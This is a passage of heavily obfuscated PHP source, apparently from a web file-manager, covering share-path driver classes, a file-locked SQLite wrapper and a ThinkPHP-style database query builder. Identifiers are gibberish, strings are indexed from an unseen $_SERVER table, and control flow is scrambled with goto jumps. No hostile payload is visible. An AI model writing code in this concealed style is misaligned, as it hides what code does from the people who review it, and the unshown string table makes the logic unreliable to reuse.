$dºäŸë›•Í = $this->model->fileInfoGet($cÊÇêî©»™); IO::fileOutImage($dºäŸë›•Í[$dÀ•ÀÇ‘‚“[76]], $FŸï£Û‚¥ï); } public function fileOutImage($D·óéñÀÌ, $eôİùä”Âå = 250) { $this->_fileOutImage($D·óéñÀÌ, $eôİùä”Âå); } public function fileOutImageServer($EğäÔ”Ä»×, $B×ÒÑ‘Ñùõ = 250) { $this->_fileOutImage($EğäÔ”Ä»×, $B×ÒÑ‘Ñùõ); } public function link($Eƒ”ñçŠƒ, $FåÊ äšß = '') { $bÚ¦†»Üˆ† = $this->model->fileInfoGet($Eƒ”ñçŠƒ); return IO::link($bÚ¦†»Üˆ†[$_SERVER[¿õñ][76]], $FåÊ äšß); } protected function parse($Cà•ŠØ¡šİ) { $aİÔ¸Áà¹ =& $_SERVER[¿õñ]; if (strstr($Cà•ŠØ¡šİ, $aİÔ¸Áà¹[8]) === !1) { return array($aİÔ¸Áà¹[382] => intval($Cà•ŠØ¡šİ), $aİÔ¸Áà¹[76] => $aİÔ¸Áà¹[33], $aİÔ¸Áà¹[1088] => array()); } $f—ë„©¨æ = explode($aİÔ¸Áà¹[8], trim($Cà•ŠØ¡šİ, $aİÔ¸Áà¹[8])); if (count($f—ë„©¨æ) < 2) { show_tips($Cà•ŠØ¡šİ . $aİÔ¸Áà¹[1092]); } return array($aİÔ¸Áà¹[382] => intval($f—ë„©¨æ[0]), $aİÔ¸Áà¹[76] => $f—ë„©¨æ[1], $aİÔ¸Áà¹[1088] => array_slice($f—ë„©¨æ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($bºÁºĞŠõ) { $this->pathParse = $bºÁºĞŠõ; $this->model = Model($_SERVER[¿õñ][1087]); } public function getPathOuter($CŠ²·¢®ãã) { $A›Åè×¼¿  =& $_SERVER[¿õñ]; if (!$CŠ²·¢®ãã) { return $CŠ²·¢®ãã; } $Bñô‹¥¦—Ã = $this->parse($CŠ²·¢®ãã); return trim(KodIO::makeShare($this->pathParse[$A›Åè×¼¿ [364]], $Bñô‹¥¦—Ã[$A›Åè×¼¿ [364]]), $A›Åè×¼¿ [8]); } protected function infoParse($d»ˆŒÌ†Òğ, $a±íÚ¦Í£¥ = false, $A×·ÌØÎ¾Ï = false) { $BœØƒ«ô‹ =& $_SERVER[¿õñ]; $eÑ•‘ÖƒÅá = $this->pathParse[$BœØƒ«ô‹[364]]; $d™Á‚ª£˜Ÿ = trim($this->pathParse[$BœØƒ«ô‹[995]], $BœØƒ«ô‹[8]); return Action($BœØƒ«ô‹[1093])->sharePathInfo($eÑ•‘ÖƒÅá, $d™Á‚ª£˜Ÿ); } public function infoFull($Fß¦Û¨ÑÜ¿) { $Câ‹˜ğ…ÚÙ =& $_SERVER[¿õñ]; $Bè•»¾¨š = explode($Câ‹˜ğ…ÚÙ[8], trim($Fß¦Û¨ÑÜ¿, $Câ‹˜ğ…ÚÙ[8])); if (count($Bè•»¾¨š) > 1) { $f‰»ÄÃ« = implode($Câ‹˜ğ…ÚÙ[8], array_splice($Bè•»¾¨š, 1)); $e¼ø¡Æ‘¡˜ = $this->model->pathInfoByPath($Bè•»¾¨š[0], $f‰»ÄÃ«); if (!$e¼ø¡Æ‘¡˜) { return !1; } $this->pathParse[$Câ‹˜ğ…ÚÙ[995]] = $e¼ø¡Æ‘¡˜[$Câ‹˜ğ…ÚÙ[366]]; } return $this->infoParse($Fß¦Û¨ÑÜ¿); } public function listAll($c»Šƒ¨—øÊ) { goto aƒÔŸ°Î‡Ú; fö‘¿Ë¸: foreach ($B¤¼äâãîÎ as &$cŒÜƒ·åŒ») { check_abort(); $cŒÜƒ·åŒ»[$f™å›â«œ[388]] = $Fò—ƒ·±->_shareItemeParse($cŒÜƒ·åŒ»[$f™å›â«œ[388]], $E¬æï±¾ÙÆ); } return $B¤¼äâãîÎ; goto cŠÎÆùèÓ§; aƒÔŸ°Î‡Ú: $f™å›â«œ =& $_SERVER[¿õñ]; $d« ‹ÃÃóË = IO::info($this->pathParse[$f™å›â«œ[76]]); if (!$d« ‹ÃÃóË) { return array(); } goto fíì¿¹”·; fíì¿¹”·: $B¤¼äâãîÎ = $this->model->listAll($c»Šƒ¨—øÊ); $E¬æï±¾ÙÆ = Model($f™å›â«œ[528])->getInfo($d« ‹ÃÃóË[$f™å›â«œ[437]]); $Fò—ƒ·± = Action($f™å›â«œ[1093]); goto fö‘¿Ë¸; cŠÎÆùèÓ§: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($BèùÄ„ˆµƒ) { $this->pathParse = $BèùÄ„ˆµƒ; $this->model = Model($_SERVER[¿õñ][1087]); } protected function infoParse($cÙŠÖ¬ÀÎ, $E¿®Å¹®ó¡ = false, $b¡†øÜ»ö­ = false) { $eÚ‹‘ŠÁµ„ =& $_SERVER[¿õñ]; return Action($eÚ‹‘ŠÁµ„[1001])->sharePathInfo($this->pathParse[$eÚ‹‘ŠÁµ„[76]], !0); } public function listAll($D‰¢î­Òå) { $f¾õİçëĞï =& $_SERVER[¿õñ]; $E˜ã´´æÚª = IO::info($this->pathParse[$f¾õİçëĞï[76]]); if (!$E˜ã´´æÚª) { return array(); } $Aç‘ö§ëÇ¨ = $this->model->listAll($D‰¢î­Òå); foreach ($Aç‘ö§ëÇ¨ as &$d†©Œ¶†É©) { $d†©Œ¶†É©[$f¾õİçëĞï[388]] = Action($f¾õİçëĞï[1001])->itemInfo($d†©Œ¶†É©[$f¾õİçëĞï[388]]); $FÓäâÔá¦« = substr($d†©Œ¶†É©[$f¾õİçëĞï[76]], strpos(ltrim($d†©Œ¶†É©[$f¾õİçëĞï[76]], $f¾õİçëĞï[8]), $f¾õİçëĞï[8]) + 1); $d†©Œ¶†É©[$f¾õİçëĞï[388]][$f¾õİçëĞï[76]] = $this->pathParse[$f¾õİçëĞï[996]] . $FÓäâÔá¦«; } return $Aç‘ö§ëÇ¨; } } goto fØäóÂ‰‡; b¿Œ‚ĞÇË: class DbSqlite3 extends DbSqlite3Base { public function query($C´Šƒ½™¹) { goto däÑù¶é’; Eà‘‰–òŞ¦: if (!$fÖĞ¼ëàô) { return !1; } if (flock($fÖĞ¼ëàô, LOCK_EX)) { $dŠ±¸¨óÇ× = parent::query($C´Šƒ½™¹); flock($fÖĞ¼ëàô, LOCK_UN); fclose($fÖĞ¼ëàô); return $dŠ±¸¨óÇ×; } flock($fÖĞ¼ëàô, LOCK_UN); goto fø“”—é¥·; fø“”—é¥·: fclose($fÖĞ¼ëàô); show_json($FŒ—¼ÎÜó[881], !1); return !1; goto d÷‘‡„õ¿Ş; däÑù¶é’: $FŒ—¼ÎÜó =& $_SERVER[¿õñ]; $eæğ¾æŠõá = DATA_PATH . $FŒ—¼ÎÜó[879]; $fÖĞ¼ëàô = fopen($eæğ¾æŠõá, $FŒ—¼ÎÜó[880]); goto Eà‘‰–òŞ¦; d÷‘‡„õ¿Ş: } public function execute($a­­µá±æŠ) { goto aà•ê“ÊÚÇ; CÂ¤‹°ÀŠô: if (!$FùÄ…¹ì…) { return !1; } if (flock($FùÄ…¹ì…, LOCK_EX)) { $eğÒÚŒ¡¬í = parent::execute($a­­µá±æŠ); flock($FùÄ…¹ì…, LOCK_UN); fclose($FùÄ…¹ì…); return $eğÒÚŒ¡¬í; } flock($FùÄ…¹ì…, LOCK_UN); goto CœÊØÛŒ÷Ê; CœÊØÛŒ÷Ê: fclose($FùÄ…¹ì…); show_json($B”éÙÔÛƒ[881], !1); return !1; goto FÙ”ÒÚçÅ¹; aà•ê“ÊÚÇ: $B”éÙÔÛƒ =& $_SERVER[¿õñ]; $B•Ÿ¯®Ë• = DATA_PATH . $B”éÙÔÛƒ[879]; $FùÄ…¹ì… = fopen($B•Ÿ¯®Ë•, $B”éÙÔÛƒ[880]); goto CÂ¤‹°ÀŠô; FÙ”ÒÚçÅ¹: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\75", "\156\145\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\145\x67\x74" => "\76\75", "\x6c\164" => "\74", "\145\154\x74" => "\x3c\x3d", "\156\157\x74\x6c\x69\x6b\x65" => "\x4e\117\124\40\x4c\111\x4b\105", "\154\151\x6b\145" => "\x4c\111\x4b\105", "\151\x6e" => "\x49\116", "\156\x6f\164\151\156" => "\116\117\124\40\x49\116", "\156\157\x74\x20\151\x6e" => "\116\x4f\x54\x20\111\116", "\142\145\x74\x77\145\145\156" => "\102\x45\124\x57\105\105\116", "\156\x6f\x74\142\145\164\x77\x65\145\156" => "\116\x4f\x54\40\102\x45\124\x57\105\105\116", "\x6e\157\x74\x20\x62\x65\164\x77\145\x65\156" => "\x4e\117\x54\x20\x42\x45\124\x57\105\x45\116"); protected $selectSql = "\123\105\x4c\105\x43\x54\x25\104\x49\123\x54\x49\x4e\103\x54\x25\x20\x25\x46\x49\105\x4c\x44\45\40\x46\x52\117\115\40\45\x54\x41\102\114\105\45\x25\x4a\117\x49\116\45\45\x57\x48\x45\x52\x45\x25\45\x47\x52\117\x55\x50\x25\x25\110\101\126\111\116\x47\45\x25\x4f\x52\x44\x45\122\45\45\x4c\111\115\111\124\45\40\x25\125\x4e\x49\x4f\116\x25\45\103\117\x4d\115\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $cÓÙÈÏ²–˜ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¿õñ][882], $cÓÙÈÏ²–˜); } public function factory($AÜ“ÚÁ™±‹ = '') { goto EŸÙĞ¦è¡; bÁõÅÄ”»‹: return $cˆ¥—…á; goto C„ŸËÜÆî‹; EŸÙĞ¦è¡: $a­ÊĞ­‡§ß =& $_SERVER[¿õñ]; $AÜ“ÚÁ™±‹ = $this->parseConfig($AÜ“ÚÁ™±‹); if (empty($AÜ“ÚÁ™±‹[$a­ÊĞ­‡§ß[883]])) { think_exception(think_lang($a­ÊĞ­‡§ß[884])); } goto AóïÇ‰Ìó; AóïÇ‰Ìó: $this->dbType = ucwords(strtolower($AÜ“ÚÁ™±‹[$a­ÊĞ­‡§ß[883]])); $AÂº§øééæ = $a­ÊĞ­‡§ß[885] . $this->dbType; if (class_exists($AÂº§øééæ)) { $cˆ¥—…á = new $AÂº§øééæ($AÜ“ÚÁ™±‹); if ($a­ÊĞ­‡§ß[731] != strtolower($AÜ“ÚÁ™±‹[$a­ÊĞ­‡§ß[883]])) { $cˆ¥—…á->dbType = strtoupper($this->dbType); } else { $cˆ¥—…á->dbType = $this->_getDsnType($AÜ“ÚÁ™±‹[$a­ÊĞ­‡§ß[835]]); } } else { think_exception(think_lang($a­ÊĞ­‡§ß[886]) . $a­ÊĞ­‡§ß[887] . $AÂº§øééæ); } goto bÁõÅÄ”»‹; C„ŸËÜÆî‹: } public function __call($dÙ²——²°±, $fÛÛãºëÁ) { if (method_exists($this, $dÙ²——²°±)) { return call_user_func_array(array($this, $dÙ²——²°±), $fÛÛãºëÁ); } } protected function _getDsnType($F±ÓŞ½œ«…) { $FÓİÈÁ¹õ = explode($_SERVER[¿õñ][4], $F±ÓŞ½œ«…); $cÚ—ÆÛÖ± = strtoupper(trim($FÓİÈÁ¹õ[0])); return $cÚ—ÆÛÖ±; } private function parseConfig($A¨ŞÓí´…é = '') { $EÇÆ ŒŠÔ“ =& $_SERVER[¿õñ]; if (!empty($A¨ŞÓí´…é) && is_string($A¨ŞÓí´…é)) { $A¨ŞÓí´…é = $this->parseDSN($A¨ŞÓí´…é); } elseif (is_array($A¨ŞÓí´…é)) { $A¨ŞÓí´…é = array_change_key_case($A¨ŞÓí´…é); $A¨ŞÓí´…é = array($EÇÆ ŒŠÔ“[883] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[888]], $EÇÆ ŒŠÔ“[807] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[889]], $EÇÆ ŒŠÔ“[808] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[890]], $EÇÆ ŒŠÔ“[805] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[891]], $EÇÆ ŒŠÔ“[806] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[892]], $EÇÆ ŒŠÔ“[17] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[893]], $EÇÆ ŒŠÔ“[835] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[894]], $EÇÆ ŒŠÔ“[13] => $A¨ŞÓí´…é[$EÇÆ ŒŠÔ“[895]]); } elseif (empty($A¨ŞÓí´…é)) { if (think_config($EÇÆ ŒŠÔ“[733]) && $EÇÆ ŒŠÔ“[731] != strtolower(think_config($EÇÆ ŒŠÔ“[730]))) { $A¨ŞÓí´…é = $this->parseDSN(think_config($EÇÆ ŒŠÔ“[733])); } else { $A¨ŞÓí´…é = array($EÇÆ ŒŠÔ“[883] => think_config($EÇÆ ŒŠÔ“[730]), $EÇÆ ŒŠÔ“[807] => think_config($EÇÆ ŒŠÔ“[896]), $EÇÆ ŒŠÔ“[808] => think_config($EÇÆ ŒŠÔ“[897]), $EÇÆ ŒŠÔ“[805] => think_config($EÇÆ ŒŠÔ“[898]), $EÇÆ ŒŠÔ“[806] => think_config($EÇÆ ŒŠÔ“[899]), $EÇÆ ŒŠÔ“[17] => think_config($EÇÆ ŒŠÔ“[231]), $EÇÆ ŒŠÔ“[835] => think_config($EÇÆ ŒŠÔ“[733]), $EÇÆ ŒŠÔ“[13] => think_config($EÇÆ ŒŠÔ“[900])); } } return $A¨ŞÓí´…é; } protected function initConnect($Aƒï‡ˆï²  = true) { if (1 == think_config($_SERVER[¿õñ][18])) { $this->_linkID = $this->multiConnect($Aƒï‡ˆï² ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($f§ÂÁ½ŒŒì = false) { $fêº®»¦‰ =& $_SERVER[¿õñ]; static $AŒŠ§ÁÈ„Ğ = array(); if (empty($AŒŠ§ÁÈ„Ğ)) { foreach ($this->config as $FÖÜ‰òà‰ => $FŒÁÕÊ–²‚) { $AŒŠ§ÁÈ„Ğ[$FÖÜ‰òà‰] = explode($fêº®»¦‰[47], $FŒÁÕÊ–²‚); } } if (think_config($fêº®»¦‰[901])) { if ($f§ÂÁ½ŒŒì) { $b¿±ùËÂ¼× = floor(mt_rand(0, think_config($fêº®»¦‰[902]) - 1)); } else { if (is_numeric(think_config($fêº®»¦‰[903]))) { $b¿±ùËÂ¼× = think_config($fêº®»¦‰[903]); } else { $b¿±ùËÂ¼× = floor(mt_rand(think_config($fêº®»¦‰[902]), count($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[805]]) - 1)); } } } else { $b¿±ùËÂ¼× = floor(mt_rand(0, count($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[805]]) - 1)); } $dÎõ…¥é› = array($fêº®»¦‰[807] => isset($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[807]][$b¿±ùËÂ¼×]) ? $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[807]][$b¿±ùËÂ¼×] : $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[807]][0], $fêº®»¦‰[808] => isset($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[808]][$b¿±ùËÂ¼×]) ? $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[808]][$b¿±ùËÂ¼×] : $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[808]][0], $fêº®»¦‰[805] => isset($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[805]][$b¿±ùËÂ¼×]) ? $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[805]][$b¿±ùËÂ¼×] : $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[805]][0], $fêº®»¦‰[806] => isset($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[806]][$b¿±ùËÂ¼×]) ? $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[806]][$b¿±ùËÂ¼×] : $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[806]][0], $fêº®»¦‰[17] => isset($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[17]][$b¿±ùËÂ¼×]) ? $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[17]][$b¿±ùËÂ¼×] : $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[17]][0], $fêº®»¦‰[835] => isset($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[835]][$b¿±ùËÂ¼×]) ? $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[835]][$b¿±ùËÂ¼×] : $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[835]][0], $fêº®»¦‰[13] => isset($AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[13]][$b¿±ùËÂ¼×]) ? $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[13]][$b¿±ùËÂ¼×] : $AŒŠ§ÁÈ„Ğ[$fêº®»¦‰[13]][0]); return $this->connect($dÎõ…¥é›, $b¿±ùËÂ¼×); } public function parseDSN($EŞßº¬»ö¥) { $BÀ¨Úº±Ä =& $_SERVER[¿õñ]; if (empty($EŞßº¬»ö¥)) { return !1; } $e‚¬³‹¾øà = parse_url($EŞßº¬»ö¥); if ($e‚¬³‹¾øà[$BÀ¨Úº±Ä[165]]) { $f­ÇÂøÌå‰ = array($BÀ¨Úº±Ä[883] => $e‚¬³‹¾øà[$BÀ¨Úº±Ä[165]], $BÀ¨Úº±Ä[807] => isset($e‚¬³‹¾øà[$BÀ¨Úº±Ä[527]]) ? $e‚¬³‹¾øà[$BÀ¨Úº±Ä[527]] : $BÀ¨Úº±Ä[33], $BÀ¨Úº±Ä[808] => isset($e‚¬³‹¾øà[$BÀ¨Úº±Ä[904]]) ? $e‚¬³‹¾øà[$BÀ¨Úº±Ä[904]] : $BÀ¨Úº±Ä[33], $BÀ¨Úº±Ä[805] => isset($e‚¬³‹¾øà[$BÀ¨Úº±Ä[166]]) ? $e‚¬³‹¾øà[$BÀ¨Úº±Ä[166]] : $BÀ¨Úº±Ä[33], $BÀ¨Úº±Ä[806] => isset($e‚¬³‹¾øà[$BÀ¨Úº±Ä[167]]) ? $e‚¬³‹¾øà[$BÀ¨Úº±Ä[167]] : $BÀ¨Úº±Ä[33], $BÀ¨Úº±Ä[17] => isset($e‚¬³‹¾øà[$BÀ¨Úº±Ä[76]]) ? substr($e‚¬³‹¾øà[$BÀ¨Úº±Ä[76]], 1) : $BÀ¨Úº±Ä[33]); } else { preg_match($BÀ¨Úº±Ä[905], trim($EŞßº¬»ö¥), $d†æ°‘‰“›); $f­ÇÂøÌå‰ = array($BÀ¨Úº±Ä[883] => $d†æ°‘‰“›[1], $BÀ¨Úº±Ä[807] => $d†æ°‘‰“›[2], $BÀ¨Úº±Ä[808] => $d†æ°‘‰“›[3], $BÀ¨Úº±Ä[805] => $d†æ°‘‰“›[4], $BÀ¨Úº±Ä[806] => $d†æ°‘‰“›[5], $BÀ¨Úº±Ä[17] => $d†æ°‘‰“›[6]); } $f­ÇÂøÌå‰[$BÀ¨Úº±Ä[835]] = $BÀ¨Úº±Ä[33]; return $f­ÇÂøÌå‰; } protected function debug() { $Eî¯œƒö³ =& $_SERVER[¿õñ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Eî¯œƒö³[906]; if (think_config($Eî¯œƒö³[907])) { think_status($Eî¯œƒö³[908]); think_trace($this->queryStr . $Eî¯œƒö³[909] . think_status($Eî¯œƒö³[20], $Eî¯œƒö³[908], 6) . $Eî¯œƒö³[910], $Eî¯œƒö³[33], $Eî¯œƒö³[911]); } } protected function parseLock($b‡ˆİ°¦õ = false) { $FŞÍšíøË× =& $_SERVER[¿õñ]; if (!$b‡ˆİ°¦õ) { return $FŞÍšíøË×[33]; } if ($FŞÍšíøË×[837] == $this->dbType) { return $FŞÍšíøË×[912]; } return $FŞÍšíøË×[913]; } protected function parseSet($bÚÜŒÅÄé) { $E¼õª¿Ğ¾Ã =& $_SERVER[¿õñ]; foreach ($bÚÜŒÅÄé as $Céæïà®Ïù => $d ÛÜë†â) { if (is_array($d ÛÜë†â) && $E¼õª¿Ğ¾Ã[282] == $d ÛÜë†â[0]) { $fŒ±çóÜÓ[] = $this->parseKey($Céæïà®Ïù) . $E¼õª¿Ğ¾Ã[914] . $d ÛÜë†â[1]; } elseif (is_scalar($d ÛÜë†â) || is_null($d ÛÜë†â)) { $fŒ±çóÜÓ[] = $this->parseKey($Céæïà®Ïù) . $E¼õª¿Ğ¾Ã[914] . $this->parseValue($d ÛÜë†â); } } return $E¼õª¿Ğ¾Ã[915] . implode($E¼õª¿Ğ¾Ã[47], $fŒ±çóÜÓ); } protected function bindParam($Cã¤¸©‹‰¸, $bê›Ç¤‡µ²) { $this->bind[$_SERVER[¿õñ][4] . $Cã¤¸©‹‰¸] = $bê›Ç¤‡µ²; } protected function parseBind($cƒƒßˆ’) { $cƒƒßˆ’ = array_merge($this->bind, $cƒƒßˆ’); $this->bind = array(); return $cƒƒßˆ’; } function parseKey(&$fˆòŒäµ¾”, $A²ƒÓ—á = true) { if ($A²ƒÓ—á) { $fˆòŒäµ¾” = $this->parseKeyCheck($fˆòŒäµ¾”); } return $fˆòŒäµ¾”; } function parseKeyCheck($dÂã©×Â¾½) { $a¸˜Âº¥ì =& $_SERVER[¿õñ]; $dÂã©×Â¾½ = trim($dÂã©×Â¾½); if (!preg_match($a¸˜Âº¥ì[916], $dÂã©×Â¾½)) { think_exception($a¸˜Âº¥ì[917] . $dÂã©×Â¾½); } return $dÂã©×Â¾½; } protected function parseValue($c¤¡Ò¡èˆ) { $E¹àçÕÛÑ =& $_SERVER[¿õñ]; if (is_string($c¤¡Ò¡èˆ)) { $c¤¡Ò¡èˆ = $E¹àçÕÛÑ[876] . $this->escapeString($c¤¡Ò¡èˆ) . $E¹àçÕÛÑ[876]; } elseif (isset($c¤¡Ò¡èˆ[0]) && is_string($c¤¡Ò¡èˆ[0]) && strtolower($c¤¡Ò¡èˆ[0]) == $E¹àçÕÛÑ[282]) { $c¤¡Ò¡èˆ = $this->escapeString($c¤¡Ò¡èˆ[1]); } elseif (is_array($c¤¡Ò¡èˆ)) { $c¤¡Ò¡èˆ = array_map(array($this, $E¹àçÕÛÑ[877]), $c¤¡Ò¡èˆ); } elseif (is_bool($c¤¡Ò¡èˆ)) { $c¤¡Ò¡èˆ = $c¤¡Ò¡èˆ ? $E¹àçÕÛÑ[493] : $E¹àçÕÛÑ[464]; } elseif (is_null($c¤¡Ò¡èˆ)) { $c¤¡Ò¡èˆ = $E¹àçÕÛÑ[100]; } return $c¤¡Ò¡èˆ; } protected function parseField($a‘•½Šç“İ) { $câ¥«ïëÛ« =& $_SERVER[¿õñ]; if (is_string($a‘•½Šç“İ) && strpos($a‘•½Šç“İ, $câ¥«ïëÛ«[47])) { $a‘•½Šç“İ = explode($câ¥«ïëÛ«[47], $a‘•½Šç“İ); } if (is_array($a‘•½Šç“İ)) { $FÏĞÓÂøÅ = array(); foreach ($a‘•½Šç“İ as $B‚‚ğ¯¬œª => $FÓ™È¤‘‚²) { if (!is_numeric($B‚‚ğ¯¬œª)) { $FÏĞÓÂøÅ[] = $this->parseKey($B‚‚ğ¯¬œª) . $câ¥«ïëÛ«[918] . $this->parseKey($FÓ™È¤‘‚²); } else { $FÏĞÓÂøÅ[] = $this->parseKey($FÓ™È¤‘‚²); } } $c§™ñ…‡ˆå = implode($câ¥«ïëÛ«[47], $FÏĞÓÂøÅ); } elseif (is_string($a‘•½Šç“İ) && !empty($a‘•½Šç“İ)) { $c§™ñ…‡ˆå = $a‘•½Šç“İ; } else { $c§™ñ…‡ˆå = $câ¥«ïëÛ«[173]; } return $c§™ñ…‡ˆå; } protected function parseTable($Bî¡ï¨²èĞ) { $få——àÉ‰® =& $_SERVER[¿õñ]; if (is_array($Bî¡ï¨²èĞ)) { $Dƒ±™ƒ¿íµ = array(); foreach ($Bî¡ï¨²èĞ as $BƒÉÚÔÒË– => $A÷§…„÷ËÚ) { if (!is_numeric($BƒÉÚÔÒË–)) { $Dƒ±™ƒ¿íµ[] = $this->parseKey($BƒÉÚÔÒË–) . $få——àÉ‰®[50] . $this->parseKey($A÷§…„÷ËÚ); } else { $Dƒ±™ƒ¿íµ[] = $this->parseKey($BƒÉÚÔÒË–); } } $Bî¡ï¨²èĞ = $Dƒ±™ƒ¿íµ; } elseif (is_string($Bî¡ï¨²èĞ)) { if (strstr($Bî¡ï¨²èĞ, $få——àÉ‰®[50])) { return $Bî¡ï¨²èĞ; } $Bî¡ï¨²èĞ = explode($få——àÉ‰®[47], $Bî¡ï¨²èĞ); array_walk($Bî¡ï¨²èĞ, array($this, $få——àÉ‰®[824])); } return $få——àÉ‰®[919] . trim(implode($få——àÉ‰®[920], $Bî¡ï¨²èĞ), $få——àÉ‰®[830]) . $få——àÉ‰®[919]; } protected function parseWhere($fÙ‡ÏËÀÈÌ) { $A‚ÃÅÔÕ†£ =& $_SERVER[¿õñ]; $EÏæŠ·â = $A‚ÃÅÔÕ†£[33]; if (is_string($fÙ‡ÏËÀÈÌ)) { $EÏæŠ·â = $fÙ‡ÏËÀÈÌ; } else { $aö©ˆŒÄºé = isset($fÙ‡ÏËÀÈÌ[$A‚ÃÅÔÕ†£[921]]) ? strtoupper($fÙ‡ÏËÀÈÌ[$A‚ÃÅÔÕ†£[921]]) : $A‚ÃÅÔÕ†£[33]; if (in_array($aö©ˆŒÄºé, array($A‚ÃÅÔÕ†£[922], $A‚ÃÅÔÕ†£[923], $A‚ÃÅÔÕ†£[924]))) { $aö©ˆŒÄºé = $A‚ÃÅÔÕ†£[50] . $aö©ˆŒÄºé . $A‚ÃÅÔÕ†£[50]; unset($fÙ‡ÏËÀÈÌ[$A‚ÃÅÔÕ†£[921]]); } else { $aö©ˆŒÄºé = $A‚ÃÅÔÕ†£[925]; } foreach ($fÙ‡ÏËÀÈÌ as $CêĞ¾ÍíèÀ => $FÛñÀñ­÷Ü) { $EÏæŠ·â .= $A‚ÃÅÔÕ†£[262]; if (is_numeric($CêĞ¾ÍíèÀ)) { $CêĞ¾ÍíèÀ = $A‚ÃÅÔÕ†£[926]; } if (0 === strpos($CêĞ¾ÍíèÀ, $A‚ÃÅÔÕ†£[71])) { $EÏæŠ·â .= $this->parseThinkWhere($CêĞ¾ÍíèÀ, $FÛñÀñ­÷Ü); } else { if (!preg_match($A‚ÃÅÔÕ†£[927], trim($CêĞ¾ÍíèÀ))) { think_exception(think_lang($A‚ÃÅÔÕ†£[928]) . $A‚ÃÅÔÕ†£[4] . $CêĞ¾ÍíèÀ); } $D†¬¯¦šÅ = is_array($FÛñÀñ­÷Ü) && isset($FÛñÀñ­÷Ü[$A‚ÃÅÔÕ†£[929]]); $CêĞ¾ÍíèÀ = trim($CêĞ¾ÍíèÀ); if (strpos($CêĞ¾ÍíèÀ, $A‚ÃÅÔÕ†£[268])) { $F‹™ƒÍ®¨ = explode($A‚ÃÅÔÕ†£[268], $CêĞ¾ÍíèÀ); $Cïğ§ÉÌ“å = array(); foreach ($F‹™ƒÍ®¨ as $e‡ù•·Ó± => $B¥éº‰á) { $BÔĞ†ÅÆ‰ = $D†¬¯¦šÅ ? $FÛñÀñ­÷Ü[$e‡ù•·Ó±] : $FÛñÀñ­÷Ü; $Cïğ§ÉÌ“å[] = $A‚ÃÅÔÕ†£[245] . $this->parseWhereItem($this->parseKey($B¥éº‰á), $BÔĞ†ÅÆ‰) . $A‚ÃÅÔÕ†£[823]; } $EÏæŠ·â .= implode($A‚ÃÅÔÕ†£[930], $Cïğ§ÉÌ“å); } elseif (strpos($CêĞ¾ÍíèÀ, $A‚ÃÅÔÕ†£[269])) { $F‹™ƒÍ®¨ = explode($A‚ÃÅÔÕ†£[269], $CêĞ¾ÍíèÀ); $Cïğ§ÉÌ“å = array(); foreach ($F‹™ƒÍ®¨ as $e‡ù•·Ó± => $B¥éº‰á) { $BÔĞ†ÅÆ‰ = $D†¬¯¦šÅ ? $FÛñÀñ­÷Ü[$e‡ù•·Ó±] : $FÛñÀñ­÷Ü; $Cïğ§ÉÌ“å[] = $A‚ÃÅÔÕ†£[245] . $this->parseWhereItem($this->parseKey($B¥éº‰á), $BÔĞ†ÅÆ‰) . $A‚ÃÅÔÕ†£[823]; } $EÏæŠ·â .= implode($A‚ÃÅÔÕ†£[925], $Cïğ§ÉÌ“å); } else { $EÏæŠ·â .= $this->parseWhereItem($this->parseKey($CêĞ¾ÍíèÀ), $FÛñÀñ­÷Ü); } } $EÏæŠ·â .= $A‚ÃÅÔÕ†£[263] . $aö©ˆŒÄºé; } $EÏæŠ·â = substr($EÏæŠ·â, 0, -strlen($aö©ˆŒÄºé)); } return empty($EÏæŠ·â) ? $A‚ÃÅÔÕ†£[33] : $A‚ÃÅÔÕ†£[931] . $EÏæŠ·â; } protected function parseWhereItem($f•ê¾ºµíÛ, $fâ·î²³Ş) { $D¡ß•‘×ÏÜ =& $_SERVER[¿õñ]; $E¬Ú›Ö Û½ = $D¡ß•‘×ÏÜ[33]; if (is_array($fâ·î²³Ş)) { if (is_string($fâ·î²³Ş[0])) { $b¾…¯…µ = strtolower($fâ·î²³Ş[0]); if (in_array($fâ·î²³Ş[0], array($D¡ß•‘×ÏÜ[914], $D¡ß•‘×ÏÜ[932], $D¡ß•‘×ÏÜ[933], $D¡ß•‘×ÏÜ[934], $D¡ß•‘×ÏÜ[935], 